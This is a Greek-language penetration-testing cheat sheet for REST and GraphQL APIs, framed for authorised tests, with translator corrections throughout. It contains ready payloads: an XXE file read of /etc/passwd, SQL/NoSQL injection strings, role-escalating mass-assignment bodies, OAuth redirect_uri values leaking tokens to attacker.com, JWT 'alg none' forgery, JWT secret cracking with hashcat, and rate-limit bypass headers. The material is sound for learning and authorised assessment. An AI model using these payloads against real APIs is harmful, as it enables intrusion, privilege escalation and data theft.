# 🔌 Οδηγός ελέγχων ασφάλειας API

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../README.md) • [🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md)

```
   █████╗ ██████╗ ██╗    ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗
  ██╔══██╗██╔══██╗██║    ██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
  ███████║██████╔╝██║    ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝ 
  ██╔══██║██╔═══╝ ██║    ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝  
  ██║  ██║██║     ██║    ███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║   
  ╚═╝  ╚═╝╚═╝     ╚═╝    ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   
```

<p align="center">
  <img src="https://img.shields.io/badge/API-Security-blue?style=for-the-badge" alt="API">
  <img src="https://img.shields.io/badge/REST-Testing-green?style=for-the-badge" alt="REST">
  <img src="https://img.shields.io/badge/GraphQL-red?style=for-the-badge" alt="GraphQL">
</p>

---

## Πριν ξεκινήσετε

Ένα **API** επιτρέπει σε εφαρμογές να ανταλλάσσουν δεδομένα και να εκτελούν λειτουργίες μέσω αιτημάτων. Το **REST** οργανώνει συνήθως διαδρομές και μεθόδους HTTP, ενώ το **GraphQL** χρησιμοποιεί ερωτήματα βάσει σχήματος.

**Βασικοί όροι:** endpoint = συγκεκριμένο σημείο API, authentication = επιβεβαίωση ταυτότητας, authorization = έλεγχος επιτρεπόμενων ενεργειών, token = στοιχείο πρόσβασης, claim = πεδίο ενός token, schema = περιγραφή δομής δεδομένων. Πρώτα καταγράψτε τους λογαριασμούς, τους ρόλους και τι πρέπει να βλέπει ο καθένας.

Οι παρακάτω δοκιμές αφορούν εργαστήρια ή στόχους που περιλαμβάνονται ρητά σε εγκεκριμένο έλεγχο. Οι διευθύνσεις, τα διαπιστευτήρια και τα αναγνωριστικά είναι ενδεικτικά. Οι εντολές και τα payloads διατηρούνται από το αγγλικό πρωτότυπο· δεν εκτελούνται κατά τη μετάφραση.

## 📋 Περιεχόμενα

- [OWASP API Top 10](#section-01)
- [Έλεγχοι REST API](#section-02)
- [Έλεγχοι GraphQL](#section-03)
- [Έλεγχοι μηχανισμών ταυτοποίησης](#section-04)
- [Έλεγχοι JWT](#section-05)
- [Συνήθεις ευπάθειες](#section-06)
- [Εργαλεία](#section-07)
- [Πηγές](#section-08)

---

<a id="section-01"></a>

## 🔴 OWASP API Top 10

> **Αντιστοίχιση έκδοσης 2023:** Η σειρά και ορισμένες ετικέτες του πρωτοτύπου ήταν ανακριβείς. Ο πίνακας αποδίδει την [ταξινόμηση OWASP API Security 2023](https://owasp.org/API-Security/editions/2023/en/0x11-t10/). Οι σύντομες περιγραφές δεν αντικαθιστούν τα πλήρη κριτήρια κάθε κατηγορίας.


| # | Αδυναμία | Περιγραφή |
| --- | --------------- | ------------- |
| 1 | **BOLA** | Ελλιπής έλεγχος δικαιωμάτων ανά αντικείμενο |
| 2 | **Ανεπαρκής ταυτοποίηση** | Αδυναμίες ταυτοποίησης |
| 3 | **BOPLA** | Ελλιπής έλεγχος δικαιωμάτων ανά ιδιότητα αντικειμένου |
| 4 | **Ανεξέλεγκτη κατανάλωση πόρων** | Ανεπαρκή όρια χρήσης πόρων και αιτημάτων |
| 5 | **BFLA** | Ελλιπής έλεγχος δικαιωμάτων ανά λειτουργία |
| 6 | **Μη περιορισμένη πρόσβαση σε ευαίσθητες επιχειρησιακές ροές** | Κατάχρηση αυτοματοποιημένων ενεργειών σημαντικών για την εφαρμογή |
| 7 | **SSRF** | Μη επιτρεπόμενα αιτήματα από τον server |
| 8 | **Λανθασμένες ρυθμίσεις ασφάλειας** | Μη ασφαλείς προεπιλογές ή ρυθμίσεις |
| 9 | **Ανεπαρκής διαχείριση αποθέματος API** | Παλιές ή μη καταγεγραμμένες εκδόσεις API |
| 10 | **Μη ασφαλής χρήση άλλων APIs** | Μη ασφαλής χρήση δεδομένων τρίτων APIs |

---

<a id="section-02"></a>

## 🌐 Έλεγχοι REST API

### Ανακάλυψη και καταγραφή

```bash
# Αναζήτηση διαδρομών API
ffuf -u https://api.target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Καταγραφή εκδόσεων
/api/v1/users
/api/v2/users
/api/v3/users
/api/beta/users
/api/latest/users

# Συνήθεις διαδρομές
/api/
/api/v1/
/api/v2/
/rest/
/graphql
/swagger/
/openapi.json
/api-docs
/swagger.json
/swagger-ui/
/docs/
```

### Έλεγχος μεθόδων HTTP

> **Τα παραδείγματα δεν είναι πλήρη αιτήματα:** Ορισμένες γραμμές παραλείπουν σώμα ή URL, ενώ DELETE/PUT/PATCH μπορούν να αλλάξουν κατάσταση. Τα JSON με σχόλια και οι ασύνδετες γραμμές του πρωτοτύπου είναι επεξηγηματικά δείγματα, όχι έτοιμα έγκυρα αρχεία.


```bash
# Έλεγχος μεθόδων HTTP
curl -X GET https://api.target.com/users/1
curl -X POST https://api.target.com/users
curl -X PUT https://api.target.com/users/1
curl -X PATCH https://api.target.com/users/1
curl -X DELETE https://api.target.com/users/1
curl -X OPTIONS https://api.target.com/users

# Παράκαμψη επιλογής μεθόδου μέσω header όπου υποστηρίζεται
curl -X POST -H "X-HTTP-Method-Override: DELETE" https://api.target.com/users/1
curl -X POST -H "X-Method-Override: PUT" https://api.target.com/users/1
```

### Τροποποίηση παραμέτρων

```bash
# BOLA/IDOR
GET /api/users/1      # Αναγνωριστικό πρώτου δοκιμαστικού χρήστη
GET /api/users/2      # Αναγνωριστικό του δεύτερου δοκιμαστικού χρήστη
GET /api/users/0
GET /api/users/-1
GET /api/users/999999

# Πολλαπλές ή αμφίσημες παράμετροι
/api/users?id=1&id=2
/api/users?id[]=1&id[]=2

# Παραλλαγές κωδικοποίησης
/api/users/1%00
/api/users/1%0a
/api/users/1%2e%2e%2f2
```

### Έλεγχοι αλλαγής Content-Type

```bash
# Αλλαγή Content-Type
Content-Type: application/json
Content-Type: application/xml
Content-Type: application/x-www-form-urlencoded
Content-Type: text/xml
Content-Type: text/plain

# Παράδειγμα XXE με αλλαγή Content-Type
curl -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user>&xxe;</user>'
```

### Μη ελεγχόμενη ανάθεση ιδιοτήτων (mass assignment)

```bash
# Προσθήκη επιπλέον πεδίων
POST /api/users
{
  "username": "test",
  "email": "test@test.com",
  "role": "admin",           # Δοκιμή προσθήκης
  "isAdmin": true,           # Δοκιμή προσθήκης
  "balance": 99999,          # Δοκιμή προσθήκης
  "verified": true           # Δοκιμή προσθήκης
}

# Χρήση πινάκων
{
  "user": {
    "name": "test",
    "role_ids": [1, 2, 3]
  }
}
```

---

<a id="section-03"></a>

## 📊 Έλεγχοι GraphQL

> **Προϋποθέσεις:** Το introspection και τα field suggestions εξαρτώνται από τη ρύθμιση του server. Ένα παράδειγμα GraphQL είναι συντακτικά ελλιπές. Η εισαγωγή SQL/NoSQL έχει αποτέλεσμα μόνο αν η εφαρμογή συνδέει μη ασφαλώς την είσοδο με backend ερώτημα· δεν είναι αυτόματη ιδιότητα του GraphQL.


### Εξερεύνηση σχήματος GraphQL (introspection)

```graphql
# Αναλυτικό ερώτημα introspection
query {
  __schema {
    types {
      name
      fields {
        name
        args { name }
      }
    }
  }
}

# Σύντομο ερώτημα introspection
{__schema{types{name,fields{name}}}}

# Καταγραφή διαθέσιμων queries
{__schema{queryType{fields{name,description}}}}

# Καταγραφή διαθέσιμων mutations
{__schema{mutationType{fields{name,description}}}}
```

### Συνήθεις κατηγορίες δοκιμών

```graphql
# IDOR
query { user(id: 2) { email, password } }

# Συνδυασμός πολλών ενεργειών σε ένα αίτημα
query {
  user1: user(id: 1) { email }
  user2: user(id: 2) { email }
  user3: user(id: 3) { email }
}

# Εμφωλευμένο ερώτημα με πιθανή εξάντληση πόρων
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          name
        }
      }
    }
  }
}

# Προτάσεις έγκυρων πεδίων
{ user { a }  # Μπορεί να προτείνει έγκυρα πεδία
```

### Έλεγχοι SQL injection μέσω GraphQL

```graphql
# Δοκιμή SQL injection σε ορίσματα
query { user(name: "' OR '1'='1") { id } }
query { users(filter: "admin'--") { id } }

# Εισαγωγή μη επιτρεπόμενης λογικής NoSQL
query { user(query: "{$gt: ''}") { id } }
```

### Έλεγχος περιορισμών introspection

```graphql
# Εναλλακτικό ερώτημα introspection
query { __type(name: "User") { fields { name } } }

# Δοκιμή υποψήφιων ονομάτων πεδίων με ffuf
# Λίστα υποψήφιων ονομάτων πεδίων GraphQL
```

---

<a id="section-04"></a>

## 🔐 Έλεγχοι μηχανισμών ταυτοποίησης

### Έλεγχος κλειδιών API

```bash
# Αναζήτηση εκτεθειμένων κλειδιών API
# Έλεγχος JavaScript, εφαρμογών κινητών και GitHub

# Έλεγχος κλειδιού σε διαφορετικά σημεία
curl -H "X-API-Key: KEY" https://api.target.com
curl -H "Authorization: Bearer KEY" https://api.target.com
curl -H "api-key: KEY" https://api.target.com
curl "https://api.target.com?api_key=KEY"
```

### Έλεγχοι OAuth/OAuth2

```bash
# Πιθανή διαρροή token μέσω redirect_uri
?redirect_uri=https://attacker.com
?redirect_uri=https://target.com.attacker.com
?redirect_uri=https://target.com%40attacker.com
?redirect_uri=https://target.com/callback/../../../attacker

# Έλεγχος συσχέτισης της παραμέτρου state
# Αφαίρεση της παραμέτρου state
# Έλεγχος αν ίδιο state γίνεται δεκτό για διαφορετικούς χρήστες

# Διαρροή token
# Έλεγχος της κεφαλίδας Referer για διαρροή token
```

### Διαχείριση συνεδριών

```bash
# Εξέταση tokens
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# Παραμένουν έγκυρα τα tokens μετά την αποσύνδεση;
# Προβλήματα ανανέωσης token
# Επαναχρησιμοποίηση token μεταξύ συνεδριών
```

---

<a id="section-05"></a>

## 🎫 Έλεγχοι JWT

### Αποκωδικοποίηση JWT

> **Η εντολή του πρωτοτύπου δεν αποκωδικοποιεί ολόκληρο JWT:** Ένα συνηθισμένο υπογεγραμμένο JWT έχει χωριστά τμήματα Base64url με τελείες. Το γενικό base64 -d πάνω σε ολόκληρο token με αποσιωπητικά δεν είναι πλήρες παράδειγμα. Η αποκωδικοποίηση δεν επαληθεύει την υπογραφή. Κρατήστε πραγματικά tokens εκτός υπηρεσιών τρίτων. Δείτε τη [μορφή JWS Compact στο RFC 7515](https://www.rfc-editor.org/rfc/rfc7515.html#section-3.1).


```bash
# Διαδικτυακά: jwt.io· μη στέλνετε πραγματικά tokens σε τρίτους
# CLI
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." | base64 -d
```

### Σύγχυση αλγορίθμων υπογραφής

> **Διευκρίνιση:** Η περιγραφόμενη σύγχυση αφορά χρήση δημόσιου κλειδιού RSA ως μυστικού HMAC όταν η υλοποίηση δεν περιορίζει σωστά τον αλγόριθμο. Η αλλαγή alg ή claims δεν αρκεί αν ο server επαληθεύει σωστά υπογραφή και κανόνες αποδοχής.


```bash
# Αλλαγή alg σε none
{
  "alg": "none",
  "typ": "JWT"
}
# Αφαίρεση υπογραφής

# Η κατεύθυνση του τίτλου είναι ανακριβής· το παράδειγμα αφορά σύγχυση RSA/HMAC
# Χρήση δημόσιου κλειδιού ως μυστικού HMAC στο αρχικό παράδειγμα
```

### Έλεγχοι επαλήθευσης υπογραφής

```bash
# Αφαίρεση υπογραφής με διατήρηση τελειών
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.

# Δοκιμή αδύναμου μυστικού
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# Ενδεικτικά αδύναμα μυστικά
secret
password
123456
your-256-bit-secret
```

### Τροποποίηση πεδίων claims

```javascript
// Αλλαγή claims χρήστη
{
  "sub": "1234567890",
  "name": "admin",        // Αλλαγή σε admin
  "role": "admin",        // Αλλαγή σε ισχυρότερο ρόλο
  "admin": true,          // Προσθήκη ένδειξης διαχειριστή
  "exp": 9999999999       // Παράταση χρόνου λήξης
}
```

### Εργαλεία ελέγχου JWT

```bash
# jwt_tool
python3 jwt_tool.py <JWT>
python3 jwt_tool.py <JWT> -T    # Τροποποίηση
python3 jwt_tool.py <JWT> -C -d wordlist.txt  # Δοκιμή υποψήφιων τιμών

# jwtcrack
./jwtcrack <JWT>
```

---

<a id="section-06"></a>

## 🐛 Συνήθεις ευπάθειες

### Έλεγχοι ορίων ρυθμού αιτημάτων

```bash
# Κεφαλίδες προς έλεγχο
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1

# Αλλαγή πεζών και κεφαλαίων
X-FORWARDED-FOR: 127.0.0.1

# Μηδενικό byte
X-Forwarded-For: 127.0.0.1%00

# Διαφορετικά endpoints
/api/login
/API/LOGIN
/api/Login
/api/login/
```

### BOLA — ελλιπής έλεγχος δικαιωμάτων αντικειμένου

```bash
# Έλεγχος τροποποίησης αναγνωριστικού
GET /api/orders/123    # Παραγγελία πρώτου δοκιμαστικού χρήστη
GET /api/orders/124    # Παραγγελία του δεύτερου δοκιμαστικού χρήστη

# Έλεγχος προβλεψιμότητας UUID
# Έλεγχος προβλέψιμων μοτίβων
# Εξέταση διαδοχικών ή χρονικών μοτίβων

# Αναγνωριστικό σε διαφορετικές μορφές
/api/users/1
/api/users/001
/api/users/user_1
/api/users/0x1
```

### BFLA — ελλιπής έλεγχος δικαιωμάτων λειτουργίας

```bash
# Έλεγχος endpoints διαχείρισης ως απλός χρήστης
GET /api/admin/users
POST /api/admin/config
DELETE /api/admin/user/1

# Έλεγχος ανά μέθοδο
GET /api/users     # Επιτρέπεται
POST /api/users    # Πρέπει να απαιτεί δικαιώματα διαχειριστή;
DELETE /api/users  # Πρέπει να απαιτεί δικαιώματα διαχειριστή;
```

### Ανεπαρκής διαχείριση αποθέματος API

```bash
# Παλαιότερες εκδόσεις API
/api/v1/users    # Παλαιότερη έκδοση που χρειάζεται ανεξάρτητο έλεγχο
/api/v2/users    # Τρέχουσα κατάσταση
/api/v3/users    # Δοκιμαστική ή μη δημοσιευμένη έκδοση

# Endpoints ανάπτυξης
/api/debug/
/api/test/
/api/internal/
/api/dev/
```

---

<a id="section-07"></a>

## 🛠️ Εργαλεία

| Εργαλείο | Σκοπός |
| ------ | --------- |
| **Burp Suite** | Παρεμβολή και έλεγχος αιτημάτων API |
| **Postman** | Εξερεύνηση API |
| **Insomnia** | Εφαρμογή πελάτη REST/GraphQL |
| **graphql-voyager** | Οπτικοποίηση σχήματος GraphQL |
| **jwt_tool** | Έλεγχοι JWT |
| **Arjun** | Ανακάλυψη παραμέτρων |

---

<a id="section-08"></a>

## 📚 Πηγές

- [OWASP — δέκα βασικές κατηγορίες κινδύνων API](https://owasp.org/API-Security/)
- [GraphQL Voyager](https://apis.guru/graphql-voyager/)
- [JWT.io](https://jwt.io/)

---

<p align="center">
  <b>🔌 Ελέγξτε την ασφάλεια των APIs!</b><br>
  <i>Μόνο για εξουσιοδοτημένους ελέγχους!</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
